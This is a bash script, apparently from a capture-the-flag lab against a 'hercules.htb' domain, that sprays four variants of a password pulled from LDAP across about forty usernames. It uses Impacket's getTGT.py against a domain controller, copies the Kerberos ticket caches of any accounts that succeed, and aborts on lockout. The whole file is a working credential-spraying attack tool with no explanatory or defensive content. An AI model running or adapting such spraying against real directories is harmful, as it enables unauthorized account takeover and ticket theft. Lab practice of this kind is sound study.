#!/bin/bash
# Spray the LDAP-extracted description (and case variants) across ALL known accounts.
DC=10.129.242.196
GT=/usr/share/doc/python3-impacket/examples/getTGT.py

USERS="adriana.i angelo.o anthony.r ashley.b auditor bob.w camilla.b clarissa.c elijah.m fernando.r fiona.c harris.d heather.s jacob.b james.s jennifer.a jessica.e joel.c johanna.f johnathan.j ken.w mark.s mikayla.a natalie.a nate.h patrick.s ramona.l ray.n rene.s shae.j stephanie.w stephen.m tanya.r taylor.m tish.c vincent.g web_admin will.s winda.s zeke.s"

PWS=(
  'change*th1s_p@ssw()rd!!'
  'Change*Th1s_p@ssw()rd!!'
  'th1s_p@ssw()rd!!'
  'Change*Th1s_P@ssw()rd!!'
)

for pw in "${PWS[@]}"; do
  echo "=== '$pw' ==="
  for u in $USERS; do
    out=$(python3 "$GT" "hercules.htb/$u:$pw" -dc-ip $DC 2>&1)
    if echo "$out" | grep -qiE 'Saving ticket|Got TGT'; then
      echo "  [VALID] $u : $pw"
      [ -f "$u.ccache" ] && cp "$u.ccache" "/home/kali/hercules/$u.ccache"
    elif echo "$out" | grep -qiE 'locked out|ACCOUNT_LOCKED'; then
      echo "  [!] $u LOCKED - aborting"; exit 1
    fi
    sleep 0.25
  done
done
echo "=== spray4 done ==="
